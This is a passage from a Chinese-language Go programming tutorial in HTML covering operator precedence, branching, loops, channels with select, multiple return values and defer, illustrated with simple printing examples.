class="headerlink" title="2. 优先级"></a>2. 优先级</h3><p>下表为各运算符的优先级示图，优先级<strong>从高到低</strong>：</p><table><thead><tr><th align="left">优先级</th><th align="left">类别</th><th align="left">运算符</th></tr></thead><tbody><tr><td align="left">1</td><td align="left">括号运算符</td><td align="left">()</td></tr><tr><td align="left">2</td><td align="left">单目运算符</td><td align="left">！、++、–</td></tr><tr><td align="left">3</td><td align="left">算数运算符</td><td align="left">*、&#x2F;、%</td></tr><tr><td align="left">4</td><td align="left">+、-</td><td align="left"></td></tr><tr><td align="left">5</td><td align="left">位移运算符</td><td align="left">&gt;&gt;、&lt;&lt;</td></tr><tr><td align="left">6</td><td align="left">关系运算符</td><td align="left">&lt;、&lt;&#x3D;、&gt;、&gt;&#x3D;</td></tr><tr><td align="left">7</td><td align="left">&#x3D;&#x3D;、!&#x3D;</td><td align="left"></td></tr><tr><td align="left">8</td><td align="left">按位与</td><td align="left">&amp;</td></tr><tr><td align="left">9</td><td align="left">按位异或</td><td align="left">^</td></tr><tr><td align="left">10</td><td align="left">按位或</td><td align="left">|</td></tr><tr><td align="left">11</td><td align="left">逻辑与</td><td align="left">&amp;&amp;</td></tr><tr><td align="left">12</td><td align="left">逻辑或</td><td align="left">||</td></tr><tr><td align="left">13</td><td align="left">赋值运算符</td><td align="left">&#x3D;、+&#x3D;、-&#x3D;、*&#x3D;、&#x2F;&#x3D;、 %&#x3D;、 &gt;&#x3D;、 &lt;&lt;&#x3D;、&amp;&#x3D;、^&#x3D;、|&#x3D;</td></tr></tbody></table><h2 id="Go语言的分支语句"><a href="#Go语言的分支语句" class="headerlink" title="Go语言的分支语句"></a>Go语言的分支语句</h2><h3 id="1-If…else"><a href="#1-If…else" class="headerlink" title="1. If…else"></a>1. If…else</h3><p>在 Go 语言中 <strong>if</strong> 关键字的作用和其它大部分语言相同，是用于测试某个布尔表达式或布尔值是否为真的。若为真则执行 if 之后 <code>&#123;&#125;</code> 中的语句，否则跳过这些语句。如果存在第二个分支，则需要使用 <strong>else</strong> 关键字，还需要增加分支的话就需要使用 <strong>else if</strong> 关键字了。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>a := <span class="hljs-number">10</span><br><span class="hljs-keyword">if</span> a &gt; <span class="hljs-number">10</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;a大于10&quot;</span>)<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> a &lt; <span class="hljs-number">0</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;a小于0&quot;</span>)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;a的值是&quot;</span>, a)<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>在 Go 语言中，<strong>if</strong> 后的条件表达式，还有一种特别的写法，可以在条件表达式之前写一个赋值表达式。</p><p><strong>if…else</strong> 的特殊用法：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">if</span> a := <span class="hljs-number">10</span>; a &gt; <span class="hljs-number">10</span> &#123; <span class="hljs-comment">//赋值表达式和条件表达式之间用;隔开</span><br>fmt.Println(<span class="hljs-string">&quot;a大于10&quot;</span>)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;a的值是&quot;</span>, a)<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="2-switch…case"><a href="#2-switch…case" class="headerlink" title="2. switch…case"></a>2. switch…case</h3><p>Go 语言对 <strong>switch…case</strong> 的功能进行了扩展，它变得更加的通用。<strong>switch</strong> 之后可以什么都不带。<strong>case</strong>也无需是一个固定值，也可以是一个布尔表达式，而且每一个 case 都是一个 <strong>独立的代码块</strong>，执行完了之后<strong>立刻跳出</strong> switch，不需要使用 <strong>break</strong>。所以可以把 <strong>if…else</strong> 完美的改写成 <strong>switch…case</strong> 的形式。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>a := <span class="hljs-string">&quot;A&quot;</span><br><span class="hljs-keyword">switch</span> a &#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>:<br>fmt.Println(<span class="hljs-string">&quot;分数区间为90~100&quot;</span>)<br><span class="hljs-keyword">case</span> <span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;b&quot;</span>:<br>fmt.Println(<span class="hljs-string">&quot;分数区间为70～89&quot;</span>)<br><span class="hljs-keyword">case</span> <span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-string">&quot;c&quot;</span>:<br>fmt.Println(<span class="hljs-string">&quot;分数区间为0~70&quot;</span>)<br><span class="hljs-keyword">default</span>:<br>fmt.Println(<span class="hljs-string">&quot;错误的评分&quot;</span>)<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>switch…case</strong> Go 语言中的新用法：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>a := <span class="hljs-number">50</span><br><span class="hljs-keyword">switch</span> &#123;<br><span class="hljs-keyword">case</span> a &lt; <span class="hljs-number">60</span>:<br>fmt.Println(<span class="hljs-string">&quot;不及格&quot;</span>)<br><span class="hljs-keyword">case</span> a &lt; <span class="hljs-number">80</span>:<br>fmt.Println(<span class="hljs-string">&quot;良好&quot;</span>)<br><span class="hljs-keyword">case</span> a &lt;= <span class="hljs-number">100</span>:<br>fmt.Println(<span class="hljs-string">&quot;优秀&quot;</span>)<br><span class="hljs-keyword">default</span>:<br>fmt.Println(<span class="hljs-string">&quot;分数最多为100分&quot;</span>)<br>&#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="Go语言的循环语句"><a href="#Go语言的循环语句" class="headerlink" title="Go语言的循环语句"></a>Go语言的循环语句</h2><p>在 Go 语言中减少了循环语句的关键字，仅有一个 <strong>for</strong> 关键字。但是并没有减少其功能，而且它更是兼容了其它语言中的<strong>while</strong>关键字的用法，甚至更强大。</p><h3 id="1-for循环语句"><a href="#1-for循环语句" class="headerlink" title="1. for循环语句"></a>1. for循环语句</h3><h4 id="1-1-普通用法"><a href="#1-1-普通用法" class="headerlink" title="1.1 普通用法"></a>1.1 普通用法</h4><p>在 Go 语言中，for 循环之后一样可以跟三个语句</p><p><strong>单次表达式；条件表达式；末尾循环体</strong></p><p>但是它不需要使用<code>()</code>来包裹这三个表达式，写法上更加的简洁。同时它也和其它语言一样，可以任意省略这三个表达式。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">for</span> a := <span class="hljs-number">0</span>; a &lt; <span class="hljs-number">10</span>; a++ &#123;<br>fmt.Println(a)<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>省略<strong>单次表达式</strong>代码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>   a := <span class="hljs-number">0</span><br>   <span class="hljs-keyword">for</span> ; a &lt; <span class="hljs-number">10</span>; a++ &#123; <span class="hljs-comment">//表达式可以省略，但是;不能省略</span><br>      fmt.Println(a)<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="1-2-代替-while-的用法"><a href="#1-2-代替-while-的用法" class="headerlink" title="1.2 代替 while 的用法"></a>1.2 代替 while 的用法</h4><p>在其它大部分语言中 <strong>for</strong> 循环中省略<strong>单次表达式</strong>和<strong>末尾循环体</strong>其实就和其它语句中的 <strong>while</strong> 用法一致了。所以在 Go 语言中，直接使用省去<strong>单次表达式</strong>和<strong>末尾循环体</strong>的 <strong>for</strong> 循环语句来代替 <strong>while</strong> 的用法，为了简便代码书写，Go 语言中 for 循环语句在省去<strong>单次表达式</strong>和<strong>末尾循环体</strong>时，可以不写分号。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>a := <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> a &lt; <span class="hljs-number">10</span> &#123; <span class="hljs-comment">//和其他语言中的while(a&lt;10)一致</span><br>fmt.Println(a)<br>a++<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="2-for-语言中的break-和-continue"><a href="#2-for-语言中的break-和-continue" class="headerlink" title="2. for 语言中的break 和 continue"></a>2. for 语言中的break 和 continue</h3><p>在我们的生产环境中，经常需要用到死循环的场景。所以在 Go 语言中新增了一个 <strong>for</strong> 关键字死循环的用法，让程序员不用写无聊的 <code>for(;;)&#123;&#125;</code>和<code>do&#123;&#125; while(1)</code>。同时可以使用 <strong>break</strong> 和 <strong>continue</strong> 来控制循环。</p><p><strong>break</strong> 和 <strong>continue</strong> 的逻辑和语法类似</p><h4 id="2-1-break跳出单层死循环"><a href="#2-1-break跳出单层死循环" class="headerlink" title="2.1  break跳出单层死循环"></a>2.1  break跳出单层死循环</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>   a := <span class="hljs-number">0</span><br>   <span class="hljs-keyword">for</span> &#123; <span class="hljs-comment">//死循环的写法就是省略 单次表达式; 条件表达式; 末尾循环体</span><br>      fmt.Println(a)<br>      a++<br>      <span class="hljs-keyword">if</span> a &gt;= <span class="hljs-number">10</span> &#123;<br>         <span class="hljs-keyword">break</span> <span class="hljs-comment">//跳出死循环</span><br>      &#125;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="2-2-break跳出多层死循环"><a href="#2-2-break跳出多层死循环" class="headerlink" title="2.2 break跳出多层死循环"></a>2.2 break跳出多层死循环</h4><p>在其它语言中，你很难去控制跳出循环的层数，在 Go 语言中提供了一种<code>break LOOP</code>的写法，可以使循环跳出到 LOOP 所在的位置。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>   a := <span class="hljs-number">0</span><br>LOOP:<br>   <span class="hljs-keyword">for</span> &#123;<br>      <span class="hljs-keyword">for</span> &#123;<br>         fmt.Println(a)<br>         a++<br>         <span class="hljs-keyword">if</span> a &gt;= <span class="hljs-number">10</span> &#123;<br>            <span class="hljs-keyword">break</span> LOOP <span class="hljs-comment">//跳出循环至LOOP所在的层级</span><br>         &#125;<br>      &#125;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Go语言的通道"><a href="#Go语言的通道" class="headerlink" title="Go语言的通道"></a>Go语言的通道</h2><p>Go 语言中有一个特殊的类型 <code>chan</code>，这是在 Go 语言的多线程操作中非常重要的一个数据类型。它的一般用于<strong>线程之间的数据传输</strong>，所以这个操作类型叫做 “ <strong>通道 (channel)</strong>“。</p><h3 id="1-通道的声明和定义"><a href="#1-通道的声明和定义" class="headerlink" title="1. 通道的声明和定义"></a>1. 通道的声明和定义</h3><p>通道可以理解为一种特殊的<strong>变量</strong>，所以它的声明和其它变量的声明并没有太大的区别，声明通道变量的写法如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> c <span class="hljs-keyword">chan</span> <span class="hljs-type">int</span> <span class="hljs-comment">//声明一个存放int类型数据的通道</span><br></code></pre></td></tr></table></figure><p>但是它声明之后并<strong>不能直接使用</strong>，需要使用内置函数 <code>make()</code> 来创建一下通道变量才可以使用：</p><blockquote><p>由于 chan 的底层是一个指针，在 Go 语言中指针初始值为空，是需要实例化的。make 就是实例化了 chan。</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> c <span class="hljs-keyword">chan</span> <span class="hljs-type">int</span> <span class="hljs-comment">//声明一个存放int类型数据的通道</span><br>c = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>, <span class="hljs-number">1</span>) <span class="hljs-comment">//创建一个长度为1的通道</span><br></code></pre></td></tr></table></figure><p>在这种情况下最好使用<code>:=</code> 来同时声明和创建：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">c := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>, <span class="hljs-number">1</span>) <span class="hljs-comment">//声明并创建一个存放int类型数据的通道</span><br></code></pre></td></tr></table></figure><h3 id="2-通道的使用"><a href="#2-通道的使用" class="headerlink" title="2. 通道的使用"></a>2. 通道的使用</h3><p>在 Go 语言中，使用 <code>&lt;-</code> 符号来向通道中塞取数据。放在通道右边 <code>chan &lt;-</code>，就是塞数据，放在通道左边 <code>&lt;- chan</code> ，就是取数据。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>   c := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>, <span class="hljs-number">1</span>)<br>   c &lt;- <span class="hljs-number">10</span>  <span class="hljs-comment">//将10塞入通道中</span><br>   i := &lt;-c <span class="hljs-comment">//将10从通道中取出，并赋值给变量i</span><br>   fmt.Println(i)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-通道结合-select-流程控制"><a href="#3-通道结合-select-流程控制" class="headerlink" title="3. 通道结合 select 流程控制"></a>3. 通道结合 select 流程控制</h3><p>在 Go 语言中为了更方便的利用通道的功能，提供了一个仅用于通道的流程控制语句：<code>select...case</code>。使用这个语句可以同时监听数个通道，非常适合用于并发时的进程调度，或者模块之间的解耦合。下面通过一个简单的例子来了解一下 <code>select...case</code> 语句。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>   c := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>, <span class="hljs-number">1</span>)<br><br>   <span class="hljs-keyword">for</span> a := <span class="hljs-number">0</span>; a &lt; <span class="hljs-number">2</span>; a++ &#123;<br>      <span class="hljs-keyword">select</span> &#123;<br>      <span class="hljs-keyword">case</span> i := &lt;-c:<br>         fmt.Println(<span class="hljs-string">&quot;从通道中取出&quot;</span>, i)<br>      <span class="hljs-keyword">case</span> c &lt;- <span class="hljs-number">10</span>:<br>         fmt.Println(<span class="hljs-string">&quot;将 10 塞入通道中&quot;</span>)<br>      &#125;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>select 语句和 switch 语句一样，case 都只会执行一个，然后立刻跳出语句。</p><h2 id="Go语言函数的返回值"><a href="#Go语言函数的返回值" class="headerlink" title="Go语言函数的返回值"></a>Go语言函数的返回值</h2><p>Go 语言的函数的返回值也有些特殊，它可以一次返回<strong>多个返回值，</strong>Go 语言中如果是单返回值，可以直接在函数声明的括号后面增加数据类型，代码示例如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Sum</span><span class="hljs-params">(a, b <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">int</span> <span class="hljs-comment">//声明并定义一个返回值为int数据类型的函数</span><br></code></pre></td></tr></table></figure><p>如果要返回多个返回值，则需要用括号包裹返回值，并使用<code>,</code>隔开所有返回值，代码示例如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Sum</span><span class="hljs-params">(a, b <span class="hljs-type">int</span>)</span></span> (<span class="hljs-type">int</span>,<span class="hljs-type">string</span>) <span class="hljs-comment">//声明并定义一个返回值为int和string数据类型的函数</span><br></code></pre></td></tr></table></figure><p>返回的方式有两种。一种是用 <strong>return</strong> 关键字加返回值直接返回，一种是<strong>声明返回值变量</strong>，使用返回值变量直接返回。</p><h3 id="1-使用-return-返回值返回"><a href="#1-使用-return-返回值返回" class="headerlink" title="1. 使用 return+ 返回值返回"></a>1. 使用 return+ 返回值返回</h3><p>Go 语言可以一次返回多个值，多个值直接跟在 <strong>return</strong> 关键字之后，使用<code>,</code>隔开即可。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">SumAndProduct</span><span class="hljs-params">(a, b <span class="hljs-type">int</span>)</span></span> (<span class="hljs-type">int</span>, <span class="hljs-type">int</span>) &#123;<br>c := a + b<br>d := a * b<br><span class="hljs-keyword">return</span> c, d <span class="hljs-comment">// 同时返回c和d两个变量</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>sum, product := SumAndProduct(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>) <span class="hljs-comment">//接受多返回的函数时，也需要用逗号隔开变量</span><br>fmt.Println(<span class="hljs-string">&quot;a + b =&quot;</span>, sum)<br>fmt.Println(<span class="hljs-string">&quot;a * b =&quot;</span>, product)<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="2-使用返回值变量返回"><a href="#2-使用返回值变量返回" class="headerlink" title="2. 使用返回值变量返回"></a>2. 使用返回值变量返回</h3><p>Go 语言还能直接在返回值处声明变量，这个变量的作用域是整个函数，并且会在 <strong>return</strong> 的时候直接返回。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">SumAndProduct</span><span class="hljs-params">(a, b <span class="hljs-type">int</span>)</span></span> (c <span class="hljs-type">int</span>, d <span class="hljs-type">int</span>) &#123;<br>c = a + b <span class="hljs-comment">//因为c和d函数返回值处已经定义了，可以直接使用</span><br>d = a * b<br><span class="hljs-keyword">return</span> <span class="hljs-comment">// 直接返回，c和d自动传出去</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>sum, product := SumAndProduct(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>) <span class="hljs-comment">//接受多返回的函数时，也需要用逗号隔开变量</span><br>fmt.Println(<span class="hljs-string">&quot;a + b =&quot;</span>, sum)<br>fmt.Println(<span class="hljs-string">&quot;a * b =&quot;</span>, product)<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="Go语言函数的-defer"><a href="#Go语言函数的-defer" class="headerlink" title="Go语言函数的 defer"></a>Go语言函数的 defer</h2><p>在 Go 语言中的 <strong>defer</strong> 关键字就是 Go 语言中延迟语句的标志。Go 语言会在函数<strong>即将返回时</strong>按<strong>逆序</strong>执行 <strong>defer</strong> 后的语句。也就是说先被 <strong>defer</strong> 的语句后执行，最先执行最后被 <strong>defer</strong> 的语句。<strong>defer</strong> 和有些语言中的 finally 语句块的用法类似，一般都用于释放一些资源，最常用的地方就是进程锁的释放。</p><h3 id="1-defer-的逆序执行"><a href="#1-defer-的逆序执行" class="headerlink" title="1. defer 的逆序执行"></a>1. defer 的逆序执行</h3><p><strong>defer</strong> 会在函数即将结束的时候执行，而且是按照 <strong>defer</strong> 的顺序<strong>逆序</strong>执行。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">defer</span> fmt.Println(<span class="hljs-string">&quot;第一个defer的语句&quot;</span>)<br><span class="hljs-keyword">defer</span> fmt.Println(<span class="hljs-string">&quot;第二个defer的语句&quot;</span>)<br><span class="hljs-keyword">defer</span> fmt.Println(<span class="hljs-string">&quot;第三个defer的语句&quot;</span>)<br>fmt.Println(<span class="hljs-string">&quot;Hello Go&quot;</span>)<br>&#125;<br><br></code></pre></td></tr></table></figure><p>结果输出</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go">Hello Go<br>第三个<span class="hljs-keyword">defer</span>的语句<br>第二个<span class="hljs-keyword">defer</span>的语句<br>第一个<span class="hljs-keyword">defer</span>的语句<br></code></pre></td></tr></table></figure><h3 id="2-defer-中的变量"><a href="#2-defer-中的变量" class="headerlink" title="2. defer 中的变量"></a>2. defer 中的变量</h3><p><strong>defer</strong> 关键字之后若有变量，则 <strong>defer</strong> 记录的是在 <strong>defer</strong> <strong>时的变量值</strong>，而不是最后函数结束时的变量值。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>a := <span class="hljs-number">10</span><br><span class="hljs-keyword">defer</span> fmt.Println(<span class="hljs-string">&quot;defer时a的值为&quot;</span>, a)<br>a = <span class="hljs-number">100</span><br>fmt.Println(<span class="hljs-string">&quot;print是a的值为&quot;</span>, a)<br>&#125;<br><br></code></pre></td></tr></table></figure><p>输出结果为</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">print</span>是a的值为 <span class="hljs-number">100</span><br><span class="hljs-attribute">defer</span>时a的值为 <span class="hljs-number">10</span><br></code></pre></td></tr></table></figure><h3 id="3-总结"><a href="#3-总结" class="headerlink" title="3. 总结"></a>3. 总结</h3><ul><li><p><strong>defer</strong> 是<strong>先声明后执行</strong>的语句模式；</p></li><li><p><strong>defer</strong> 会在函数<strong>即将结束</strong>的时候统一执行；</p></li><li><p><strong>defer</strong> 中的变量值<strong>不会</strong>被 <strong>defer</strong> 